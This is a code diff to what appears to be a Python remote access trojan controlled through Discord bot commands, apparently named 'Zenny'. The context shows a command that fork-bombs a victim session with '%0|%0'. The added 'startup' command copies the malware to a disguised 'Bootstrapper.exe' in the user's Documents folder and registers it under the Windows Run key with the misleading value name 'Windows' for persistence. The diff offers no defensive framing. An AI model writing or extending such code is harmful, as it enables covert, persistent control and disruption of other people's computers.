@@ -17,6 +17,9 @@ import pyautogui
 import socket
 import pyperclip
 import pygame
+import winreg
+import sys
+import shutil
 from PIL import ImageGrab
 from io import BytesIO
 from discord import File
@@ -475,6 +478,24 @@ async def fork(ctx, seshn):
         command = "%0|%0"
         os.system(command)
         await ctx.send(f"Forkbombed session :rofl:")
+    else:
+        pass
+    
+@bot.command()
+async def startup(ctx, seshn):
+    session = sessions.get(seshn.lower())
+    if session:
+        exe = 'Bootstrapper.exe'
+        key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+        directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
+        path = os.path.join(directory, exe)
+        os.makedirs(directory, exist_ok=True)
+        script_path = sys.argv[0]
+        shutil.copy(script_path, path)
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)
+
+        await ctx.send(f'Put Zenny on startup :smiling_imp:')
     else:
         pass
 
